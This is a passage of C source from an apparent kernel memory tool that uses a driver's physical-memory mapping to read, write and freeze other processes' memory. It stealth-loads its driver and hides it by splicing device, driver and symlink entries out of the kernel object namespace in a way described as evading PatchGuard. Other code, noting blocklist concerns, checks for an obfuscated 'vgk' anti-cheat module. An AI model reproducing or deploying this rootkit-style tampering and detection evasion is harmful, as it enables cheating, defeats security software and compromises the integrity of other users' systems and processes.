    if (!rd_kva(st.cr3, buf, nm, ln)) return 0;
    nm[ln / 2] = 0;
    return ln / 2;
}

static BOOL name_has_looplpt(const wchar_t *nm, UINT32 n)
{
    for (UINT32 k = 0; k + 7 <= n; k++)
        if (!_wcsnicmp(nm + k, L"LoopLpt", 7)) return TRUE;
    return FALSE;
}

static int cmd_hide(void)
{
    printf("[-] hide disabled - KLDR splice trips PatchGuard (0x109/0x19).\n"
           "    use the ns-strip cmd instead: PG-safe namespace strips.\n");
    return 1;
}


typedef LONG (WINAPI *NtQSI_t)(ULONG, void *, ULONG, ULONG *);

static int qsi_handles(unsigned char **out_buf, ULONG_PTR *out_cnt)
{
    static NtQSI_t p;
    if (!p) {
        HMODULE nt = GetModuleHandleW(L"ntdll.dll");
        if (nt) p = (NtQSI_t)(void *)GetProcAddress(nt, "NtQuerySystemInformation");
        if (!p) return 0;
    }
    ULONG need = 0x400000;
    for (int round = 0; round < 5; round++) {
        unsigned char *b = malloc(need);
        if (!b) return 0;
        ULONG ret = 0;
        LONG s = p(0x40, b, need, &ret);  // SystemExtendedHandleInformation
        if (s >= 0) { *out_buf = b; *out_cnt = *(ULONG_PTR *)b; return 1; }
        free(b);
        if (!ret || ret <= need) return 0;// hard failure, not size
        need = ret + 0x100000;
    }
    return 0;
}

static int vgk_live(void)
{
    static NtQSI_t p;
    if (!p) {
        HMODULE nt = GetModuleHandleW(L"ntdll.dll");
        if (nt) p = (NtQSI_t)(void *)GetProcAddress(nt, "NtQuerySystemInformation");
        if (!p) return 0;
    }
    ULONG need = 0x40000;
    for (int round = 0; round < 4; round++) {
        unsigned char *b = malloc(need);
        if (!b) return 0;
        ULONG ret = 0;
        LONG s = p(0x0B, b, need, &ret);         // SystemModuleInformation
        if (s >= 0) {
            ULONG cnt = *(ULONG *)b;
            unsigned char *e = b + 8;            // entries @ +8, stride 0x128
            int found = 0;
            for (ULONG i = 0; i < cnt; i++, e += 0x128) {
                unsigned short off = *(unsigned short *)(e + 0x26);
                const char *nm = (const char *)(e + 0x28) + off;
                char v3[4];
                xo_a(v3, 4, OB_VGK, OB_VGK_N);
                if (!_strnicmp(nm, v3, 3)) { found = 1; break; }
            }
            free(b);
            return found;
        }
        free(b);
        if (!ret || ret <= need) return 0;
        need = ret + 0x10000;
    }
    return 0;
}

static UINT64 own_handle_object(HANDLE h)
{
    unsigned char *b; ULONG_PTR cnt;
    if (!qsi_handles(&b, &cnt)) return 0;
    ULONG_PTR me = GetCurrentProcessId(), found = 0;
    unsigned char *e = b + 0x10;              // skip Count + Reserved
    for (ULONG_PTR i = 0; i < cnt && !found; i++, e += 0x28) {
        if (*(ULONG_PTR *)(e + 0x08) == me &&
            *(ULONG_PTR *)(e + 0x10) == (ULONG_PTR)(uintptr_t)h)
            found = *(ULONG_PTR *)(e + 0x00);
    }
    free(b);
    return (UINT64)found;
}

// scan [body-0xB0, body-0x30) for a UNICODE_STRING whose buffer reads back as
// `leaf` - returns the KVA of the UNICODE_STRING itself (inside name-info).
static UINT64 find_name_us(UINT64 body, const wchar_t *leaf)
{
    UINT32 want = (UINT32)wcslen(leaf) * 2;
    if (!want || want > 0x78) return 0;
    for (UINT64 p = body - 0x38; p >= body - 0xB0; p -= 8) {
        unsigned char raw[16];
        if (!rd_kva(st.cr3, p, raw, 16)) continue;
        UINT32 ln = raw[0] | (raw[1] << 8);
        UINT32 mx = raw[2] | (raw[3] << 8);
        UINT64 buf = *(UINT64 *)(raw + 8);
        if (ln != want || mx < ln || mx > 0x100 || !is_kva(buf)) continue;
        wchar_t got[64];
        if (!rd_kva(st.cr3, buf, got, want)) continue;
        if (!wmemcmp(got, leaf, want / 2)) return p;
    }
    return 0;
}

static int dir_find_entry(UINT64 dir, UINT64 obj, UINT64 *pred_kva,
                          UINT64 *ent_kva, int *bucket)
{
    for (int b = 0; b < 37; b++) {
        UINT64 bk = dir + 8 * b, e = 0, prev = bk;
        if (!rd_kva(st.cr3, bk, &e, 8)) continue;
        for (int d = 0; is_kva(e) && d < 512; d++) {
            UINT64 o = 0, nx = 0;
            if (!rd_kva(st.cr3, e + 8, &o, 8) || !rd_kva(st.cr3, e, &nx, 8)) break;
            if (o == obj) { *pred_kva = prev; *ent_kva = e; *bucket = b; return 1; }
            prev = e; e = nx;
        }
    }
    return 0;
}

// RootDirectory sits at/behind the name US; each candidate offset is verified by
// containment (some bucket entry points back at obj) before it is used.
static UINT64 parent_dir(UINT64 name_us, UINT64 obj)
{
    static const UINT64 off[4] = { 8, 0x10, 0, 0x18 };
    for (int i = 0; i < 4; i++) {
        UINT64 cand = 0;
        if (!rd_kva(st.cr3, name_us - off[i], &cand, 8) || !is_kva(cand)) continue;
        UINT64 p, e; int b;
        if (dir_find_entry(cand, obj, &p, &e, &b)) return cand;
    }
    return 0;
}

static int splice_out(UINT64 dir, UINT64 obj, const wchar_t *tag)
{
    UINT64 pred, ent; int b;
    if (!dir_find_entry(dir, obj, &pred, &ent, &b)) {
        printf("[ns] %ls: no entry points at object (already stripped?)\n", tag);
        return 1;                             // target state reached - OK
    }
    UINT64 nxt = 0, o2 = 0;
    if (!rd_kva(st.cr3, ent, &nxt, 8)) { printf("[-] %ls ChainLink read fail\n", tag); return 0; }
    // re-verify identity right before the write
    if (!rd_kva(st.cr3, ent + 8, &o2, 8) || o2 != obj) {
        printf("[-] %ls entry identity changed mid-flight - splice aborted\n", tag);
        return 0;
    }
    if (!wr_kva(st.cr3, pred, &nxt, 8)) { printf("[-] %ls SPLICE WRITE FAIL\n", tag); return 0; }
    UINT64 chk = 0;
    rd_kva(st.cr3, pred, &chk, 8);
    printf("[ns] %ls bucket %d: [%llx] %llx -> %llx\n", tag, b,
           (unsigned long long)pred, (unsigned long long)ent, (unsigned long long)nxt);
    return chk == nxt;
}

static int im_ok(UINT64 body)
{
    UINT8 v = 0;
    return rd_kva(st.cr3, body - 0x30 + 0x19, &v, 1) && (v & 0x02) && v < 0x80;
}
static int im_ok_b(UINT64 body)
{
    UINT8 v = 0;
    return rd_kva(st.cr3, body - 0x30 + 0x1A, &v, 1) && (v & 0x02) && v < 0x80;
}
static int resolve_im_off(UINT64 dev, UINT64 drv, UINT64 lnk)
{
    int have_lnk = is_kva(lnk) ? 1 : 0;
    int a = im_ok(dev) && im_ok(drv) && (!have_lnk || im_ok(lnk));
    int b = im_ok_b(dev) && im_ok_b(drv) && (!have_lnk || im_ok_b(lnk));
    if (a && !b) return 0;
    if (b && !a) return 1;
    if (!a && !b) { printf("[!] no InfoMask candidate valid - IM bits NOT touched\n"); return -1; }
    UINT8 da = 0, dd = 0, ba = 0, bd = 0;
    rd_kva(st.cr3, drv - 0x30 + 0x19, &da, 1);
    rd_kva(st.cr3, dev - 0x30 + 0x19, &dd, 1);
    rd_kva(st.cr3, drv - 0x30 + 0x1A, &ba, 1);
    rd_kva(st.cr3, dev - 0x30 + 0x1A, &bd, 1);
    if (da == 0x02 && dd == 0x12) return 0;
    if (ba == 0x02 && bd == 0x12) return 1;
    printf("[!] InfoMask offset ambiguous (drv %02x/%02x dev %02x/%02x)"
           " - IM bits NOT touched\n", da, ba, dd, bd);
    return -1;
}

static int clear_name_bit(UINT64 body, int use_b, const wchar_t *tag)
{
    UINT64 k = body - 0x30 + (use_b ? 0x1A : 0x19);
    UINT8 im = 0, chk = 0xFF;
    if (!rd_kva(st.cr3, k, &im, 1)) { printf("[-] %ls InfoMask read fail\n", tag); return 0; }
    if (!(im & 0x02)) { printf("[ns] %ls InfoMask=%02x name bit already clear\n", tag, im); return 1; }
    UINT8 nim = im & 0xFD;
    if (!wr_kva(st.cr3, k, &nim, 1) || !rd_kva(st.cr3, k, &chk, 1) || chk != nim) {
        printf("[-] %ls InfoMask write/verify FAIL (%02x)\n", tag, chk);
        return 0;
    }
    printf("[ns] %ls InfoMask %02x -> %02x\n", tag, im, chk);
    return 1;
}

static int cmd_omstrip(int mode)
{
    if (!st.cr3) { printf("[-] ns: no cr3 - run: auto\n"); return 1; }

    // leaf name from the live device path (\\.\iomap01 -> iomap01)
    const wchar_t *src = g_dev[0] ? g_dev : st.devn;
    if (!src[0]) { printf("[-] ns: no device name\n"); return 1; }
    wchar_t leaf[64];
    const wchar_t *last = src;
    for (const wchar_t *q = src; *q; q++) if (*q == L'\\') last = q + 1;
    size_t ll = wcslen(last);
    if (!ll || ll >= 64) { printf("[-] ns: bad leaf\n"); return 1; }
    wcscpy(leaf, last);

    UINT64 file = own_handle_object(hdev);
    if (!is_kva(file)) { printf("[-] ns: own handle not found in handle table\n"); return 1; }
    UINT16 ftype = 0;
    if (rd_kva(st.cr3, file, &ftype, 2) && ftype != 5)
        printf("[!] handle object type=%u (expected 5=File) - continuing, hops are proven downstream\n", ftype);
    UINT64 dev = 0, drv = 0;
    if (!rd_kva(st.cr3, file + 0x08, &dev, 8) || !is_kva(dev)) {
        printf("[-] ns: DEVICE_OBJECT read fail (file+8)\n"); return 1;
    }
    if (!rd_kva(st.cr3, dev + 0x08, &drv, 8) || !is_kva(drv)) {
        printf("[-] ns: DRIVER_OBJECT read fail (dev+8)\n"); return 1;
    }
    printf("[ns] file=%llx dev=%llx drv=%llx leaf=%ls\n",
           (unsigned long long)file,
           (unsigned long long)dev, (unsigned long long)drv, leaf);
    UINT64 dev_us = find_name_us(dev, leaf);
    UINT64 drv_us = find_name_us(drv, leaf);
    if ((!dev_us && mode != 2) || (!drv_us && mode != 1)) {
        printf("[-] ns: name-info US not found (dev_us=%llx drv_us=%llx mode=%d)"
               " - already stripped?\n",
               (unsigned long long)dev_us, (unsigned long long)drv_us, mode);
        return 1;
    }
    if (mode == 1)
        printf("[ns] keep-drv mode: \\Driver\\%ls stays named (unload needs it)\n",
               leaf);
    if (mode == 2)
        printf("[ns] drv-only mode: \\Device + \\GLOBAL?? stay named "
               "(respawn opens + blocklist-clean per-boot randoms)\n");
    UINT64 devdir = dev_us ? parent_dir(dev_us, dev) : 0;
    UINT64 drvdir = drv_us ? parent_dir(drv_us, drv) : 0;
    if ((!is_kva(devdir) && mode != 2) || (!is_kva(drvdir) && mode != 1)) {
        printf("[-] ns: parent directory not provable (devdir=%llx drvdir=%llx)\n",
               (unsigned long long)devdir, (unsigned long long)drvdir);
        return 1;
    }
    printf("[ns] devdir=%llx drvdir=%llx\n",
           (unsigned long long)devdir, (unsigned long long)drvdir);

    // symlink via namespace root: \Device's own dir object -> "\"
    // (mode 2 skips this entirely: \GLOBAL?? stays named by contract)
    UINT64 lnk = 0, globdir = 0;
    UINT64 devdir_us = (mode != 2 && devdir) ? find_name_us(devdir, L"Device") : 0;
    UINT64 root = devdir_us ? parent_dir(devdir_us, devdir) : 0;
    if (is_kva(root)) {
        for (int b = 0; b < 37 && !globdir; b++) {
            UINT64 e = 0;
            if (!rd_kva(st.cr3, root + 8 * b, &e, 8)) continue;
            for (int d = 0; is_kva(e) && d < 512 && !globdir; d++) {
                UINT64 o = 0, nx = 0;
                if (!rd_kva(st.cr3, e + 8, &o, 8) || !rd_kva(st.cr3, e, &nx, 8)) break;
                if (is_kva(o) && find_name_us(o, L"GLOBAL??")) globdir = o;
                e = nx;
            }
        }
        if (is_kva(globdir))
            for (int b = 0; b < 37 && !lnk; b++) {
                UINT64 e = 0;
                if (!rd_kva(st.cr3, globdir + 8 * b, &e, 8)) continue;
                for (int d = 0; is_kva(e) && d < 512 && !lnk; d++) {
                    UINT64 o = 0, nx = 0;
                    if (!rd_kva(st.cr3, e + 8, &o, 8) || !rd_kva(st.cr3, e, &nx, 8)) break;
                    if (is_kva(o) && find_name_us(o, leaf)) lnk = o;
                    e = nx;
                }
            }
    }
    if (!is_kva(lnk) && mode != 2)
        printf("[!] symlink (\\GLOBAL??\\%ls) not derivable - stripping dev+drv only\n", leaf);
    else if (is_kva(lnk))
        printf("[ns] root=%llx globdir=%llx symlink=%llx\n",
               (unsigned long long)root, (unsigned long long)globdir,
               (unsigned long long)lnk);

    // TypeIndex cookie: soft identity cross-check (never gates a write)
    int cookie = -1, ti_hb = 0, ti_shift = 0;
    for (int shift = 0; shift < 2 && cookie < 0; shift++) {
        UINT64 s1 = shift ? (dev - 0x30) : dev, s2 = shift ? (drv - 0x30) : drv;
        for (int hb = 0; hb < 2 && cookie < 0; hb++) {
            UINT8 a = 0, c = 0;
            if (!rd_kva(st.cr3, dev - 0x18 - hb, &a, 1)) continue;
            if (!rd_kva(st.cr3, drv - 0x18 - hb, &c, 1)) continue;
            for (int k = 0; k < 256; k++) {
                if ((UINT8)(a ^ k ^ (UINT8)(s1 >> 8)) == 33 &&
                    (UINT8)(c ^ k ^ (UINT8)(s2 >> 8)) == 34) {
                    cookie = k; ti_hb = hb; ti_shift = shift; break;
                }
            }
        }
    }
    if (cookie >= 0) {
        printf("[ns] type cookie=%02x (TI byte body-0x1%x, shift base %s)\n",
               cookie, 8 - ti_hb, ti_shift ? "header" : "body");
        if (is_kva(lnk)) {
            UINT8 t = 0;
            UINT64 s = ti_shift ? (lnk - 0x30) : lnk;
            if (rd_kva(st.cr3, lnk - 0x18 - ti_hb, &t, 1)) {
                UINT8 real = (UINT8)(t ^ cookie ^ (UINT8)(s >> 8));
                if (real == 4) printf("[ns] symlink type decode = 4 OK\n");
                else printf("[!] symlink type decode = %u (expected 4) - continuing, splices are containment-proven\n", real);
            }
        }
    } else {
        printf("[!] TypeIndex cookie not derivable - soft check skipped\n");
    }

    // InfoMask offset resolution (needs all target bodies)
    int use_b = resolve_im_off(dev, drv, lnk);  // -1 = skip IM writes

    // writes: splice first, then bit clear
    int ok = 1;
    if (mode != 2) ok &= splice_out(devdir, dev, L"\\Device");
    if (mode != 1 && is_kva(drvdir)) ok &= splice_out(drvdir, drv, L"\\Driver");
    if (mode != 2) {
        if (is_kva(lnk) && is_kva(globdir)) ok &= splice_out(globdir, lnk, L"\\GLOBAL??");
        else if (is_kva(lnk)) { printf("[-] symlink dir missing - link splice skipped\n"); ok = 0; }
    }

    if (use_b >= 0) {
        if (mode != 2) ok &= clear_name_bit(dev, use_b, L"\\Device");
        if (mode != 1) ok &= clear_name_bit(drv, use_b, L"\\Driver");
        if (mode != 2 && is_kva(lnk)) ok &= clear_name_bit(lnk, use_b, L"\\GLOBAL??");
    }

    // verify pass
    UINT64 p, e; int b;
    int left = 0;
    if (mode != 2 && dir_find_entry(devdir, dev, &p, &e, &b)) left++;
    if (mode != 1 && is_kva(drvdir) && dir_find_entry(drvdir, drv, &p, &e, &b)) left++;
    if (mode != 2 && is_kva(lnk) && is_kva(globdir) &&
        dir_find_entry(globdir, lnk, &p, &e, &b)) left++;
    printf("[ns] verify: %d namespace entr%s left pointing at our objects\n",
           left, left == 1 ? "y" : "ies");
    printf("[ns] rd/wr unaffected (handle-held).%ls\n",
           mode == 2 ? L" \\\\.\\ opens keep WORKING (device + symlink stay)."
                     : L" New opens by name will FAIL now.");
    return (ok && !left) ? 0 : 1;
}

static int cmd_load(const wchar_t *name)
{
    wchar_t dn[80];
    if (!enable_load_priv()) return 1;
    if (!stealth_load_ephem(name, dn, 80))
        return 1;
    if (!try_dev(dn)) {
        printf("[-] loaded but %ls not openable (Exclusive holder? name clash?)\n", dn);
        return 1;
    }
    if (!g_daemon) CloseHandle(hdev);           // daemon keeps its serving handle
    wcscpy(g_dev, dn);
    wcscpy(st.devn, dn);
    save_state();
    g_fresh_load = 1;
    printf("[+] %ls open OK, stored as state dev (g_dev=%ls)\n", dn, g_dev);
    return 0;
}

static UINT64 target_dtb(const EPINFO *p, UINT64 va, const char **which)
{
    if (va >= 0xffff800000000000ull && (p->dtb & ~0xFFFULL)) {
        *which = "dtb"; return p->dtb;
    }
    if (p->udtb & ~0xFFFULL) { *which = "udtb"; return p->udtb; }
    *which = "dtb"; return p->dtb;
}

static UINT64 whex(const wchar_t *s) { return wcstoull(s, NULL, 16); }
static UINT64 wnum(const wchar_t *s) { return wcstoull(s, NULL, 0); }
static UINT wnum2(wchar_t c) {
    if (c >= L'0' && c <= L'9') return c - L'0';
    if (c >= L'a' && c <= L'f') return c - L'a' + 10;
    if (c >= L'A' && c <= L'F') return c - L'A' + 10;
    return 16;
}

// raw kernel-VA read via st.cr3 - no EPROCESS needed. Validates the walk itself.
static int cmd_kr(UINT64 va, UINT32 len)
{
    printf("[+] kr va=%llx len=%u via cr3=%llx path=%d\n",
           (unsigned long long)va, len, (unsigned long long)st.cr3, g_path);
    UINT64 pa = pa_of(st.cr3, va);
    printf("[+] v2p -> %llx\n", (unsigned long long)pa);
    if (!pa) return 1;
    unsigned char m[0x1000];
    if (!rd_phys(pa, m, len)) return 1;
    hexdump(va, m, len);
    return 0;
}

static int wnib(wchar_t c)
{
    if (c >= L'0' && c <= L'9') return c - L'0';
    if (c >= L'a' && c <= L'f') return c - L'a' + 10;
    if (c >= L'A' && c <= L'F') return c - L'A' + 10;
    return -1;
}

// hex bytes across argv args: "deadbeef" or "de ad be ef"; -1 = parse error
static int parse_hexbytes(wchar_t **av, int from, int argc, unsigned char *o, UINT32 max)
{
    UINT32 n = 0;
    for (int i = from; i < argc; i++) {
        const wchar_t *h = av[i];
        for (; h[0] && h[1] && n < max; h += 2) {
            int a = wnib(h[0]), b = wnib(h[1]);
            if (a < 0 || b < 0) return -1;
            o[n++] = (unsigned char)(a * 16 + b);
        }
        if (h[0] && !h[1]) return -1;     // dangling nibble
    }
    return (int)n;
}

// subcommands

static int cmd_init(int argc, wchar_t **argv)
{
    if (argc < 3) {
        printf("usage: init <kernel_cr3_hex> [nt_base_hex] [sep_hex]\n"
               "  sep = System EPROCESS physical address (from offline dump analysis)\n");
        return 1;
    }
    load_state();                           // merge: keep old nt/sep if not given
    st.cr3 = whex(argv[2]);
    if (st.cr3 & 0xFFF) printf("[!] cr3 %llx not page-aligned - storing anyway\n",
                               (unsigned long long)st.cr3);
    if (argc > 3) st.nt  = whex(argv[3]);
    if (argc > 4) st.sep = whex(argv[4]);
    if (!save_state()) return 1;
    printf("[+] init done - next: procs\n");
    return 0;
}

static int cmd_procs(void)
{
    printf("[+] EPROCESS phys walk (offsets 19045: pid+%x links+%x name+%x dtb+%x udtb+%x)\n",
           O_PID, O_LINKS, O_NAME, O_DTB, O_UDTB);
    walk_procs(TRUE, NO_PID, NULL);
    return 0;
}

static int cmd_rd(UINT64 pid, UINT64 va, UINT32 len)
{
    EPINFO p;
    if (!walk_procs(FALSE, pid, &p)) { printf("[-] pid %llu not found\n",
                                              (unsigned long long)pid); return 1; }
    const char *w; UINT64 dtb = target_dtb(&p, va, &w);
    printf("[+] pid %llu (%s) via %s=%llx\n", (unsigned long long)pid, p.name, w,
           (unsigned long long)dtb);
    unsigned char m[0x1000];
    if (!rd_kva(dtb, va, m, len)) {
        printf("[-] read %llx len %u failed (unmapped or paged out)\n",
               (unsigned long long)va, len);
        return 1;
    }
    hexdump(va, m, len);
    return 0;
}

static int cmd_wr(UINT64 pid, UINT64 va, int argc, wchar_t **argv)
{
    unsigned char m[0x1000];
    int n = parse_hexbytes(argv, 4, argc, m, sizeof m);
    if (n <= 0) { printf("[-] no/invalid hexbytes (even-length hex, e.g. 90 or 90 90)\n"); return 1; }
    EPINFO p;
    if (!walk_procs(FALSE, pid, &p)) { printf("[-] pid %llu not found\n",
                                              (unsigned long long)pid); return 1; }
    const char *w; UINT64 dtb = target_dtb(&p, va, &w);
    printf("[+] pid %llu (%s) via %s=%llx - WRITE %d bytes: ",
           (unsigned long long)pid, p.name, w, (unsigned long long)dtb, n);
    hexline(m, (UINT32)n);
    printf("\n");
    if (!wr_kva(dtb, va, m, (UINT32)n)) { printf("[-] write failed\n"); return 1; }
    unsigned char back[0x1000];
    BOOL ok = rd_kva(dtb, va, back, (UINT32)n) && !memcmp(back, m, (UINT32)n);
    printf("[%c] readback %s\n", ok ? '+' : '-', ok ? "match" : "MISMATCH");
    return ok ? 0 : 1;
}

static int cmd_watch(UINT64 pid, UINT64 va, UINT32 len, DWORD iv)
{
    EPINFO p;
    if (!walk_procs(FALSE, pid, &p)) { printf("[-] pid %llu not found\n",
                                              (unsigned long long)pid); return 1; }
    const char *w; UINT64 dtb = target_dtb(&p, va, &w);
    printf("[+] watch pid %llu (%s) va=%llx len=%u via %s=%llx%s\n",
           (unsigned long long)pid, p.name, (unsigned long long)va, len, w,
           (unsigned long long)dtb, iv ? " - Ctrl+C to stop" : " (one-shot)");
    unsigned char cur[0x1000], prev[0x1000];
    if (!rd_kva(dtb, va, prev, len)) {
        printf("[-] initial read failed (unmapped or paged out)\n");
        return 1;
    }
    printf("[t=0 baseline]\n");
    hexdump(va, prev, len);
    if (!iv) return 0;
    UINT64 t0 = GetTickCount64();
    int fails = 0, changes = 0;
    for (;;) {
        Sleep(iv);
        if (t_dead) return 0;                   // daemon: client pipe broke
        if (!rd_kva(dtb, va, cur, len)) {
            if (++fails == 10) {            // process may have recycled its DTB
                printf("[.] 10 read fails - re-resolving pid\n");
                if (!walk_procs(FALSE, pid, &p)) { printf("[-] pid gone\n"); return 1; }
                UINT64 nd = target_dtb(&p, va, &w);
                if (nd != dtb) { printf("[+] new dtb=%llx\n", (unsigned long long)nd); dtb = nd; }
                fails = 0;
            }
            continue;
        }
        fails = 0;
        if (memcmp(cur, prev, len)) {
            changes++;
            stamp_ms(t0);
            printf(" #%d\n", changes);
            hexdump(va, cur, len);
            memcpy(prev, cur, len);
        }
    }
}

static int cmd_freeze(UINT64 pid, UINT64 va, const wchar_t *hexstr, DWORD iv)
{
    unsigned char want[0x1000];
    int n = 0;
    for (const wchar_t *p = hexstr; *p; p += 2) {  // single-arg hexstring, e.g. 0000803F
        if (!iswxdigit(p[0]) || !p[1] || !iswxdigit(p[1]) ||
            n >= (int)sizeof want) { n = 0; break; }
        want[n++] = (UINT8)((wnum2(p[0]) << 4) | wnum2(p[1]));
    }
    if (n <= 0) { printf("[-] invalid hexstring (even-length hex, e.g. 0000803F)\n"); return 1; }
    EPINFO p;
    if (!walk_procs(FALSE, pid, &p)) { printf("[-] pid %llu not found\n",
                                              (unsigned long long)pid); return 1; }
    const char *w; UINT64 dtb = target_dtb(&p, va, &w);
    printf("[+] freeze pid %llu (%s) va=%llx len=%d via %s=%llx - want ",
           (unsigned long long)pid, p.name, (unsigned long long)va, n, w,
           (unsigned long long)dtb);
    hexline(want, (UINT32)n);
    printf("%s\n", iv ? " - Ctrl+C to stop" : " (one-shot)");
    if (!wr_kva(dtb, va, want, (UINT32)n)) { printf("[-] write failed\n"); return 1; }
    unsigned char cur[0x1000];
    BOOL ok = rd_kva(dtb, va, cur, (UINT32)n) && !memcmp(cur, want, (UINT32)n);
    printf("[%c] initial freeze %s\n", ok ? '+' : '-', ok ? "match" : "MISMATCH");
    if (!ok || !iv) return ok ? 0 : 1;
    UINT64 t0 = GetTickCount64();
    int fails = 0, corrections = 0;
    for (;;) {
        Sleep(iv);
        if (t_dead) return 0;                   // daemon: client pipe broke
        if (!rd_kva(dtb, va, cur, (UINT32)n)) {
            if (++fails == 10) {            // process may have recycled its DTB
                printf("[.] 10 read fails - re-resolving pid\n");
                if (!walk_procs(FALSE, pid, &p)) { printf("[-] pid gone\n"); return 1; }
                UINT64 nd = target_dtb(&p, va, &w);
                if (nd != dtb) { printf("[+] new dtb=%llx\n", (unsigned long long)nd); dtb = nd; }
                fails = 0;
            }
            continue;
        }
        fails = 0;
        if (memcmp(cur, want, (UINT32)n)) {
            corrections++;
            stamp_ms(t0);
            printf(" fix #%d was ", corrections);
            hexline(cur, (UINT32)n);
            printf("\n");
            if (!wr_kva(dtb, va, want, (UINT32)n)) {
                printf("[-] re-write failed\n");
                continue;
            }
            if (!rd_kva(dtb, va, cur, (UINT32)n) || memcmp(cur, want, (UINT32)n))
                printf("[!] readback MISMATCH after fix #%d\n", corrections);
        }
    }
}

#define PMAX 64
static MAPVIEW pmaps[PMAX];         // views kept alive on purpose (never unwound)
static UINT64   pm_pa[PMAX];        // physical anchor of each view
static UINT64   pm_bufva;           // mapself: the daemon-owned buffer VA
static int      npm;

static int cmd_maps(void)
{
    if (!pin_n && !npm) { printf("[maps] none\n"); return 0; }
    {
        int live = 0;
        UINT64 probe = 0;
        for (int i = 0; i < pin_n; i++)
            if (!pins[i].dead &&
                !IsBadReadPtr((void *)(pins[i].base + (pins[i].blk & 0xFFF)), 8))
                live++;
        (void)probe;
        printf("[maps] pins %d/%d live (%llu KB pinned, cap %llu KB)\n",
               live, pin_n, (unsigned long long)((UINT64)pin_n * 64),
               (unsigned long long)((UINT64)PINMAX * 64));
    }
    for (int i = 0; i < npm; i++)
        printf("[maps] %2d pa=%llx base=%llx at=%llx\n", i,
               (unsigned long long)pm_pa[i],
               (unsigned long long)pmaps[i].m.base,
               (unsigned long long)pmaps[i].at);
    if (pm_bufva) printf("[maps] selftest buffer va=%llx\n",
                         (unsigned long long)pm_bufva);
    return 0;
}

static int cmd_mapself(int write)
{
    if (npm >= PMAX - 1) { printf("[-] map table full\n"); return 1; }
    void *buf = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) { printf("[-] VirtualAlloc err=%lu\n", GetLastError()); return 1; }
    memset(buf, 0, 0x1000);
    unsigned char sig[8] = { 0xEF,0xBE,0xAD,0xDE,0xFE,0xCA,0xBE,0xBA };
    memcpy(buf, sig, 8);
    EPINFO p;
    UINT64 pid = GetCurrentProcessId();
    if (!walk_procs(FALSE, pid, &p)) { printf("[-] self pid %llu not found\n",
                                              (unsigned long long)pid); return 1; }
    const char *wd; UINT64 dtb = target_dtb(&p, (UINT64)(UINT_PTR)buf, &wd);
    UINT64 pa = pa_of(dtb, (UINT64)(UINT_PTR)buf);
    if (!pa) { printf("[-] v2p of own buffer failed\n"); return 1; }
    MAPVIEW v;
    if (!wmap(pa, 0x1000, &v, write ? 1 : 0)) return 1;
    if (IsBadReadPtr((void *)v.at, 16)) { printf("[-] fresh view already dead\n"); wunmap(&v); return 1; }
    pmaps[npm] = v; pm_pa[npm] = pa & ~0xFFFULL; npm++;
    pm_bufva = (UINT64)(UINT_PTR)buf;
    printf("[map] self bufva=%llx pa=%llx view=%llx (w=%d) sig seen: ",
           (unsigned long long)pm_bufva, (unsigned long long)pa,
           (unsigned long long)v.at, write);
    if (!memcmp((void *)v.at, sig, 8)) printf("MATCH\n");
    else printf("MISMATCH (view sees other bytes)\n");
    return 0;
}

// try ONE view larger than the 64K default: if the driver accepts size>0x10000
// the full-RAM map collapses from 128K IOCTLs to a handful of calls.
static int cmd_mapbig(UINT64 pa, UINT32 size, int write)
{
    if (npm >= PMAX - 1) { printf("[-] map table full\n"); return 1; }
    MAPVIEW v;
    memset(&v.m, 0, sizeof v.m);
    v.m.size  = size;
    v.m.phys  = pa;
    v.m.write = write ? 1 : 0;
    DWORD n2 = 0;
    if (!DeviceIoControl(hdev, MAP, &v.m, sizeof v.m, &v.m, sizeof v.m, &n2, NULL)) {
        printf("[-] mb pa=%llx size=%x err=%lu\n", (unsigned long long)pa, size, GetLastError());
        return 1;
    }
    printf("[+] mb ioctl ok: in(pa=%llx sz=%x) -> out(base=%llx phys=%llx sz=%x)\n",
           (unsigned long long)pa, size,
           (unsigned long long)v.m.base, (unsigned long long)v.m.phys,
           (unsigned)v.m.size);
    if (!v.m.base) { printf("[-] no base\n"); return 1; }
    UINT64 delta = pa - v.m.phys;
    v.at = v.m.base + delta;
    // probe first, middle, last 4K of the REQUESTED span
    UINT64 probes[3] = { 0, (UINT64)size / 2, (UINT64)size - 0x1000 };
    for (int i = 0; i < 3; i++) {
        if (IsBadReadPtr((void *)(v.at + probes[i]), 16))
            printf("[-] probe off=%llx DEAD\n", (unsigned long long)probes[i]);
        else
            printf("[+] probe off=%llx ok: %02x %02x %02x %02x\n", (unsigned long long)probes[i],
                   *(unsigned char *)(v.at + probes[i]),
                   *(unsigned char *)(v.at + probes[i] + 1),
                   *(unsigned char *)(v.at + probes[i] + 2),
                   *(unsigned char *)(v.at + probes[i] + 3));
    }
    pmaps[npm] = v; pm_pa[npm] = pa & ~0xFFFULL; npm++;
    return 0;
}

static int cmd_fullmap(void)
{
    if (!dev_acquire()) { printf("[-] pin window failed\n"); return 1; }
    t_autopin = 1;
    UINT64 e = 0;
    pin_add(st.cr3 & ~0xFFFULL);
    if (st.sep) pin_add(st.sep & ~0xFFFULL);
    if (pin_read(st.cr3 & ~0xFFFULL, &e, 8))
        printf("[pins] PML4 of cr3=%llx reads\n", (unsigned long long)st.cr3);
    else
        printf("[!] PML4 pa=%llx not pinnable\n",
               (unsigned long long)(st.cr3 & ~0xFFFULL));
    if (st.sep && pin_read(st.sep, &e, 8))
        printf("[pins] sep=%llx reads - walk_procs driverless OK\n",
               (unsigned long long)st.sep);
    else if (st.sep)
        printf("[!] sep=%llx not pinnable - walk will take a window\n",
               (unsigned long long)st.sep);
    walk_procs(TRUE, 0, NULL);       // lists + pins every EPROCESS page
    t_autopin = 0;
    dev_release();
    printf("[pins] warm set: %d views (%llu KB)\n",
           pin_n, (unsigned long long)((UINT64)pin_n * 64));
    return 0;
}

static int cmd_watch0(UINT64 pid, UINT64 va, UINT32 len, DWORD iv)
{
    EPINFO p;
    const char *wd = "";
    UINT64 dtb = 0;
    unsigned char prev[0x1000];
    // setup window: walk + baseline read with autopin
    if (!dev_acquire()) { printf("[-] w0 setup window failed\n"); return 1; }
    t_autopin = 1;
    int bad = 0;
    if (!walk_procs(FALSE, pid, &p))
        { printf("[-] pid %llu not found\n", (unsigned long long)pid); bad = 1; }
    else {
        dtb = target_dtb(&p, va, &wd);
        if (!rd_kva(dtb, va, prev, len)) {
            printf("[-] initial read failed (unmapped or paged out)\n");
            bad = 1;
        }
    }
    t_autopin = 0;
    dev_release();
    if (bad) return 1;
